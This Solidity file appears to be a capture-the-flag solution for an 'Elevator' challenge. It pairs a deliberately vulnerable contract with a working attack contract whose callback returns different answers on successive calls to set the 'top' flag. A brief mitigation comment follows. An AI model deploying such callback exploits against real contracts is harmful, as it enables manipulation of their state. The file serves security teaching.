// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}


// Attack smart contract
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator{
 function goTo(uint) external;
 }

contract Attack{

  bool isSecondTime;

  function isLastFloor(uint) external returns(bool){
    if(isSecondTime){
      return true;
    }
    isSecondTime = true;
    return false;
  }

  function attack(address _target) external{
    IElevator elevator = IElevator(_target);
    elevator.goTo(1);
  }

}

// Recommended Mitigation steps
// Use View or Pure to prevent state modifications. 
